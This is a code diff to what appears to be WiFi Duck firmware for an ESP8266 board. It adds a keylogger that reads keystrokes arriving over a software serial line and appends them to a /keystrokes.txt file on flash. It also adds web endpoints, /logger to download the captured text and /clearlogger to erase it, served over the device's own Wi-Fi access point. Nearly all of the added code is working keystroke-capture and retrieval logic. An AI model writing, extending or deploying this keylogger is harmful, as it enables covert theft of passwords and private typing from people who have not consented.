@@ -9,9 +9,20 @@
 
 #include "Settings.h"
 
-#define BAUD_RATE 57200
+#define SS_BAUD_RATE 57600  // Baudrate for the keylogging Serial
+#define BAUD_RATE 115200  // Baudrate for the (debug) Serial
 #define bufferSize 600
 #define debug false
+
+#include <SoftwareSerial.h>  // https://github.com/plerup/espsoftwareserial
+#ifdef SoftwareSerial_h
+// ESP-12 or NodeMCU:
+#define SERIAL_TX       12  //  gpio12 pin (D6) for SoftwareSerial TX (RX on Arduino)
+#define SERIAL_RX       14  //  gpio14 pin (D5) for SoftwareSerial RX (TX on Arduino)
+SoftwareSerial mySerial(SERIAL_RX, SERIAL_TX, false, 255); // (RX, TX or -1, inverted, buffer)
+#else
+#define mySerial Serial
+#endif
 
 /* ============= CHANGE WIFI CREDENTIALS ============= */
 const char *ssid = "WiFi Duck";
@@ -51,6 +62,12 @@ uint8_t scriptLineBuffer[bufferSize];
 int bc = 0; //buffer counter
 int lc = 0; //line buffer counter
 
+//// START KEYLOGGER CODE
+#define KEYLOGGER
+#ifdef KEYLOGGER
+File loggerfile;
+#endif
+/// END KEYLOGGER
 
 void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
   File f;
@@ -87,8 +104,9 @@ void sendSettings(AsyncWebServerRequest *request) {
 
 void setup() {
   
-  Serial.begin(BAUD_RATE);
-  delay(2000);
+  if (debug) Serial.begin(BAUD_RATE);
+  mySerial.begin(SS_BAUD_RATE);
+  delay(100);
   if(debug) Serial.println("\nstarting...\nSSID: "+ (String)ssid +"\nPassword: "+ (String)password);
 
   EEPROM.begin(4096);
@@ -104,9 +122,24 @@ void setup() {
 	  runLine = true;
   }
   
-  WiFi.mode(WIFI_STA);
+  WiFi.mode(WIFI_AP);
   WiFi.softAP(settings.ssid, settings.password, settings.channel, settings.hidden);
   
+//// START KEYLOGGER CODE
+#ifdef KEYLOGGER
+  loggerfile = SPIFFS.open("/keystrokes.txt", "a+");
+  if(!loggerfile) {
+    Serial.println("loggerfile open failed for append");
+//    SPIFFS.format();
+//    loggerfile = SPIFFS.open("/keystrokes.txt", "a+");
+    loggerfile = SPIFFS.open("/keystrokes.txt", "w");
+    if(!loggerfile) {
+      Serial.println("loggerfile open failed again after write attempt");
+    }
+  }
+#endif
+//// END KEYLOGGER
+
   // ===== WebServer ==== //
   MDNS.addService("http","tcp",80);
 
@@ -339,6 +372,20 @@ void setup() {
     }
   });
   
+//// START KEYLOGGER CODE
+#ifdef KEYLOGGER
+  server.on("/logger", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
+  });
+
+  server.on("/clearlogger", HTTP_GET, [](AsyncWebServerRequest *request){
+    loggerfile.close();
+    loggerfile = SPIFFS.open("/keystrokes.txt", "w");
+    request->send(200, "text/plain", "loggerfile cleared!");
+  });
+#endif
+//// END KEYLOGGER
+
   server.begin();
   
   if(debug) Serial.println("started");
@@ -393,4 +440,15 @@ void loop() {
     }
   }
 
+//// START KEYLOGGER CODE
+#ifdef KEYLOGGER
+  if(mySerial.available()) {
+    char c = mySerial.read();
+    if (!SPIFFS.exists("/keystrokes.txt")) {
+      loggerfile = SPIFFS.open("/keystrokes.txt", "a+");
+    }
+    loggerfile.write(c);
+    if (debug) Serial.write(c);
+  }
+#endif
 }
